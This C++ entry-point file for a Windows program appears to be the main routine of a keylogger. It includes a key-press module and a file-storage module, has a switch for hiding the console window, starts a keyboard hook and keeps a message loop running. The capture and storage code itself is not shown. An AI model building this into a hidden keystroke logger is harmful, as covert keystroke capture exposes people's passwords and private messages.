/*
 * main.cpp
 *
 *  Created on: Dec 6, 2017
 *      Author: julio.andrade
 */

#include "main.h"

#include "FileSave\store.h"
#include "KeyPress\keyPress.h"
#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>


#define VISIBLE 1




int main()
{
	// visibility of window
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), VISIBLE); // visible window

	// Set the hook
	 keyPress::Start();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
